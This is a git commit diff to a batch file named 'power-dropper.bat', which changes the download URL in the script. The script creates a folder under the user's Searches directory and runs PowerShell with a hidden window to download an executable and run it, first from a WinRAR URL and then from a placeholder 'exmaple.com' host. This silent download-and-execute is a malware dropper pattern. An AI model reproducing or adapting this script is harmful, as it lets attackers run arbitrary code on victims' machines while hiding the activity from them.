31871f9b46a1e758ed7abc88d3a01c0f70c2f272
codingcoderwhat <37680195+codingcoderwhat@users.noreply.github.com>
2018-11-06 09:58:07 -0500

    Update power-dropper.bat

--- power-dropper.bat
+++ power-dropper.bat
@@ -4,5 +4,5 @@ cd %userprofile%
 cd Searches
 mkdir 123
 cd 123 
-powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile 1234.exe -Uri https://www.rarlab.com/rar/winrar-x64-561.exe
+powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile 1234.exe -Uri https://www.exmaple.com/file/example.exe
 .\1234.exe
